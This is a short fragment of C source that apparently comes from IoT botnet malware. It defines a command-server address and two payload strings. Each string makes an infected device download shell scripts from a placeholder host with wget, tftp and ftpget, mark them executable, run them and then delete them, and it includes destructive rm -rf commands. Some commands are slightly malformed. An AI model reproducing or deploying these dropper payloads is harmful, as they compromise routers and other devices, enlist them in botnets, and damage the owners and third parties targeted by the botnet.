...
unsigned char *commServer[] = { "0.0.0.0:8978" };
char *Busybox_Payload = "cd /tmp || cd /var/system || cd /mnt || cd /lib;rm -f /tmp/ || /var/run/ || /var/system/ || /mnt/ || /lib/;cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;busybox wget 0.0.0.0/bins.sh;chmod 777;sh bins.sh;busybox tftp -g 0.0.0.0 -r tftp1.sh;chmod 777 ;sh tftp1.sh;busybox tftp -g 0.0.0.0 -r tftp2.sh;chmod 777 ;sh tftp2.sh";
char *Payload = "cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; wget http://0.0.0.0/gtop.sh; chmod 777 gtop.sh; sh gtop.sh; tftp 0.0.0.0 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 0.0.0.0; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 0.0.0.0 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf gtop.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf */r/n"
